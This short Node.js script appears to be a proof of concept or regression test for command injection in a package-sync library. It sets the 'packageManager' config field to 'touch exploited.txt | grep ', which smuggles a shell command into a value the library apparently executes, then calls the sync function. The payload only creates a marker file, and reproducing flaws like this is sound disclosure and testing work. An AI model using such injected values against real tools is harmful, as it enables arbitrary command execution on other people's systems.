'use strict'


const pkg = require('../src');

const cfg = {
    packageManager: 'touch exploited.txt | grep ',
    packageDir: process.cwd(),
    onlySpecified: true,
    install: true
};

pkg.sync(cfg, function() {});
